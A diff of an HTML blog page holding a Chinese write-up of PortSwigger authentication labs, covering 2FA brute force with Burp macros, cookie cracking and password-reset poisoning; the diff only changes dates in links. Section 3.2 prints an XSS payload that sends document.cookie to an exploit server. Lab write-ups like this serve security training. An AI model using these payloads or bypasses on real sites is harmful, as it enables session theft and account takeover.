 <h3 id="2-2-实验：验证机制缺陷"><a href="#2-2-实验：验证机制缺陷" class="headerlink" title="2.2 实验：验证机制缺陷"></a>2.2 实验：验证机制缺陷</h3><p>使用<code>wiener:peter</code>凭证登录，再输入四位校验码即可登录成功。</p>
 <p>从抓包来看，即是访问POST &#x2F;login、GET &#x2F;login2、POST &#x2F;login2三步请求。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771687847266.png" alt="1771687847266"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771687847266.png" alt="1771687847266"></p>
 <p>经过测试，即使是用账号密码认证成功，不访问&#x2F;login2界面，邮箱中是不会发送校验码的（猜测也没有生成）。</p>
 <p>只有访问下面的界面，才会生成四位校验码。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771688048379.png" alt="1771688048379"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771688048379.png" alt="1771688048379"></p>
 <p>继续测试，首先使用账号密码认证成功，得到Set-Cookie的session值。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771688175435.png" alt="1771688175435"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771688175435.png" alt="1771688175435"></p>
 <p>访问四位验证码界面，并且修改用户名为<code>carlos</code>。</p>
 <p>并且在<code>wiener</code>的邮箱中没有收到验证码，猜测<code>carlos</code>用户的验证码生成成功。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771688199027.png" alt="1771688199027"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771688199027.png" alt="1771688199027"></p>
 <p>之后尝试用任意验证码进行认证，认证失败。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771688344433.png" alt="1771688344433"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771688344433.png" alt="1771688344433"></p>
 <p>使用爆破模块爆破四位验证码。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771688389803.png" alt="1771688389803"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771688389803.png" alt="1771688389803"></p>
 <p>得到有效验证码为<code>1642</code>，并且返回了有效Cookie。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771688503150.png" alt="1771688503150"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771688503150.png" alt="1771688503150"></p>
 <h3 id="2-3-实验：爆破验证码"><a href="#2-3-实验：爆破验证码" class="headerlink" title="2.3 实验：爆破验证码"></a>2.3 实验：爆破验证码</h3><p>输入<code>carlos:montoya</code>登录，抓包进行流程分析。</p>
 <p>访问登录页面，返回csrf token值。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771689133664.png" alt="1771689133664"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771689133664.png" alt="1771689133664"></p>
 <p>使用凭证登录，需要携带上一步返回包中的session和csrf token值。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771689040229.png" alt="1771689040229"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771689040229.png" alt="1771689040229"></p>
 <p>访问输入校验码页面，服务端生成校验码，并返回csrf token值。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771689190416.png" alt="1771689190416"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771689190416.png" alt="1771689190416"></p>
 <p>输入任意的校验码进行认证，携带上面的csrf token值。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771689233101.png" alt="1771689233101"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771689233101.png" alt="1771689233101"></p>
 <p>三次认证失败之后，csrf token值会失效，无法进行爆破。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771689307714.png" alt="1771689307714"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771689307714.png" alt="1771689307714"></p>
 <p>在一次输入四位校验码流程中，需要一次获取session值，两次获取csrf token值。</p>
 <p>无法进行常规爆破，只能利用宏结合单线程进行爆破尝试。</p>
 <p>Settings-&gt;Sessions-&gt;Session Handling Rules-&gt;Add添加规则。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771690185354.png" alt="1771690185354"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771690185354.png" alt="1771690185354"></p>
 <p>Scope-&gt;URL Scope-&gt;Include all URLs设置作用范围为所有URL。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771690254551.png" alt="1771690254551"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771690254551.png" alt="1771690254551"></p>
 <p>Detail-&gt;Rule Actions-&gt;Add-&gt;Run a macro添加宏，将前三个认证包添加到宏。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771690370304.png" alt="1771690370304"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771690370304.png" alt="1771690370304"></p>
 <p>测试宏，验证成功。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771689719397.png" alt="1771689719397"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771689719397.png" alt="1771689719397"></p>
 <p>现在使用爆破模块进行爆破校验码，设置并发请求为1。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771689870129.png" alt="1771689870129"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771689870129.png" alt="1771689870129"></p>
 <p>上面这种爆破方式只能绕过校验，并且以单线程爆破，可以维持一直进行爆破。</p>
 <p>但是无法保证爆破成功率并且速率慢，毕竟每次爆破生成的验证码都是随机的。</p>
 <h2 id="3-其他认证机制"><a href="#3-其他认证机制" class="headerlink" title="3. 其他认证机制"></a>3. 其他认证机制</h2><h3 id="3-1-实验：保持用户登录"><a href="#3-1-实验：保持用户登录" class="headerlink" title="3.1 实验：保持用户登录"></a>3.1 实验：保持用户登录</h3><p>使用<code>wiener:peter</code>进行登录，并且勾选Stay logged in选项。</p>
 <p>在返回包中Set-Cookie中还返回了stay-logged-in值。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771692968982.png" alt="1771692968982"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771692968982.png" alt="1771692968982"></p>
 <p>stay-logged-in值可以Base64解密，确认了密码格式为Base64(username:md5(password))。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771693031059.png" alt="1771693031059"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771693031059.png" alt="1771693031059"></p>
 <p>并且测试发现，stay-logged-in即可代表用户身份。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771693119030.png" alt="1771693119030"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771693119030.png" alt="1771693119030"></p>
 <p>生成对应的密码字典，设置Base64编码，进行爆破。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771693375295.png" alt="1771693375295"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771693375295.png" alt="1771693375295"></p>
 <p>爆破成功，得到Cookie值。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771693534729.png" alt="1771693534729"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771693534729.png" alt="1771693534729"></p>
 <h3 id="3-2-实验：密码离线破解"><a href="#3-2-实验：密码离线破解" class="headerlink" title="3.2 实验：密码离线破解"></a>3.2 实验：密码离线破解</h3><p>在产品评论区发现了存储型XSS漏洞。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771693660819.png" alt="1771693660819"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771693660819.png" alt="1771693660819"></p>
 <p>构造Payload抓取目标用户Cookie，在Server成功抓取了Cookie。</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&#x27;https://exploit-0a3f00bc04382248808602f801f600bf.exploit-server.net/?Cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771693797136.png" alt="1771693797136"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771693797136.png" alt="1771693797136"></p>
 <p>在CrackStation网站上破解成功<code>carlos</code>用户的密码为<code>onceuponatime</code>。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694024776.png" alt="1771694024776"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694024776.png" alt="1771694024776"></p>
 <h3 id="3-3-实验：密码重置损坏"><a href="#3-3-实验：密码重置损坏" class="headerlink" title="3.3 实验：密码重置损坏"></a>3.3 实验：密码重置损坏</h3><p>测试网站的密码重置功能，首先输入用户名，即可发送一封邮件。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694198637.png" alt="1771694198637"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694198637.png" alt="1771694198637"></p>
 <p>在邮箱中获得了一个重置密码的链接。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694221761.png" alt="1771694221761"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694221761.png" alt="1771694221761"></p>
 <p>点击重置密码链接，输入新密码即可完成重置。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694313030.png" alt="1771694313030"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694313030.png" alt="1771694313030"></p>
 <p>抓包发现，重置密码数据包中用户名是传参形式的。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694408958.png" alt="1771694408958"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694408958.png" alt="1771694408958"></p>
 <p>修改用户名为carlos，进行重置密码。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694596716.png" alt="1771694596716"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694596716.png" alt="1771694596716"></p>
 <p>使用<code>carlos:123456</code>进行登录，发现修改密码成功。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694616085.png" alt="1771694616085"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694616085.png" alt="1771694616085"></p>
 <h3 id="3-4-实验：密码重置中毒"><a href="#3-4-实验：密码重置中毒" class="headerlink" title="3.4 实验：密码重置中毒"></a>3.4 实验：密码重置中毒</h3><p>密码重置功能，包含唯一令牌的链接是通过电子邮件发送的。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694777891.png" alt="1771694777891"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694777891.png" alt="1771694777891"></p>
 <p>通过X-Forwarded-Host标头，使用它将动态生成的重置链接指向任意域。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694863025.png" alt="1771694863025"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694863025.png" alt="1771694863025"></p>
 <p>在Server端已经收到了包含令牌的密码重置链接。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694904019.png" alt="1771694904019"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694904019.png" alt="1771694904019"></p>
 <p>进入密码重置页面，即可重置密码为<code>123456</code>。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771694938421.png" alt="1771694938421"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771694938421.png" alt="1771694938421"></p>
 <h3 id="3-5-实验：密码更改爆破"><a href="#3-5-实验：密码更改爆破" class="headerlink" title="3.5 实验：密码更改爆破"></a>3.5 实验：密码更改爆破</h3><p>在登录页面，密码尝试三次之后，IP会被锁定1分钟，无法通过爆破页面登录。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771695333548.png" alt="1771695333548"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771695333548.png" alt="1771695333548"></p>
 <p>使用<code>wiener:peter</code>进行登录后，发现一个重置密码功能。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771695051110.png" alt="1771695051110"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771695051110.png" alt="1771695051110"></p>
 <p>经过测试，当两个新密码不一样时，如果旧密码不正确，返回界面如下。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771695624739.png" alt="1771695624739"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771695624739.png" alt="1771695624739"></p>
 <p>如果旧密码正确，会返回两个密码不一样。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771695711294.png" alt="1771695711294"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771695711294.png" alt="1771695711294"></p>
 <p>爆破，得到<code>carlos</code>用户密码为<code>123123</code>。</p>
-<p><img src="/2026/02/20/PortSwigger-Authentication/1771695757889.png" alt="1771695757889"></p>
+<p><img src="/2026/02/21/PortSwigger-Authentication/1771695757889.png" alt="1771695757889"></p>
 <h2 id="4-总结思考"><a href="#4-总结思考" class="headerlink" title="4. 总结思考"></a>4. 总结思考</h2><h3 id="4-1-功能点测试"><a href="#4-1-功能点测试" class="headerlink" title="4.1 功能点测试"></a>4.1 功能点测试</h3><p>常规登录框：</p>
 <ul>
 <li>用户名枚举：返回值巨大差异、返回值微小差异、响应时间差异（长密码）。</li>
@@ -425,17 +425,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/20/PortSwigger-Authentication/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/20/PortSwigger-Authentication/&text=PortSwigger Authentication"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/20/PortSwigger-Authentication/&is_video=false&description=PortSwigger Authentication"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PortSwigger Authentication&body=Check out this article: http://example.com/2026/02/20/PortSwigger-Authentication/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/20/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/20/PortSwigger-Authentication/&name=PortSwigger Authentication&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/20/PortSwigger-Authentication/&t=PortSwigger Authentication"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/02/21/PortSwigger-Authentication/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/02/21/PortSwigger-Authentication/&text=PortSwigger Authentication"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/02/21/PortSwigger-Authentication/&is_video=false&description=PortSwigger Authentication"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PortSwigger Authentication&body=Check out this article: http://example.com/2026/02/21/PortSwigger-Authentication/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/02/21/PortSwigger-Authentication/&title=PortSwigger Authentication"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/02/21/PortSwigger-Authentication/&name=PortSwigger Authentication&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/02/21/PortSwigger-Authentication/&t=PortSwigger Authentication"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
